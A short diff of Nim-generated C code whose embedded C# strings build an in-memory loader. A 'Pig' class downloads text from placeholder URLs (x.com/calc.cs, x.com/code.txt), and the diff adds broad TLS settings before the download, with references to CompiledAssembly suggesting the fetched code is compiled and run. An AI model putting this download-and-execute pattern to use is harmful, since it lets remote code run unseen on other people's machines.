@@ -209,7 +209,7 @@ N_LIB_PRIVATE N_NIMCALL(void, winim_clrDatInit000)(void);
 N_LIB_PRIVATE N_NIMCALL(void, winim_clrInit000)(void);
 N_LIB_PRIVATE N_NIMCALL(void, NimMainModule)(void);
 extern TNimType NTIvariant__VYnrN9cMJav8fTNB7Pu9bPZw_;
-STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_3, "using System.Net;\012using System.Text;\012public class Pig\012    {\012        public string http(string url)\012        {\012            WebClient myWebClient = new WebClient();\012            byte[] myDataBuffer = myWebClient.DownloadData(url);\012            string SourceCode = Encoding.GetEncoding(\"UTF-8\").GetString(myDataBuffer);\012            return SourceCode;\012        }\012}\012", 357);
+STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_3, "using System.Net;\012using System.Text;\012public class Pig\012    {\012        public string http(string url)\012        {\012            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.SystemDefault | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;\012            WebClient myWebClient = new WebClient();\012            byte[] myDataBuffer = myWebClient.DownloadData(url);\012            string SourceCode = Encoding.GetEncoding(\"UTF-8\").GetString(myDataBuffer);\012            return SourceCode;\012        }\012}\012", 586);
 STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_5, "System.dll", 10);
 static NIM_CONST tyArray__nHXaesL0DJZHyVS07ARPRA TM__V45tF8B8NBcxFcjfe7lhBw_4 = {((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_5)}
 ;
@@ -218,8 +218,8 @@ STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_8, "CompiledAssembly", 16);
 STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_9, "Pig", 3);
 extern TNimType NTIstring__77mFvmsOLKik79ci2hXkHEg_;
 STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_11, "http", 4);
-STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_12, "https://x.com/calc.cs", 29);
-STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_14, "https://x.com/code.txt", 30);
+STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_12, "https://x.com/calc.cs", 20);
+STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_14, "https://x.com/code.txt", 21);
 STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_17, "System.Windows.Forms.dll", 24);
 static NIM_CONST tyArray__Re75IspeoxXy2oCZHwcRrA TM__V45tF8B8NBcxFcjfe7lhBw_16 = {((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_5),
 ((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_17)}
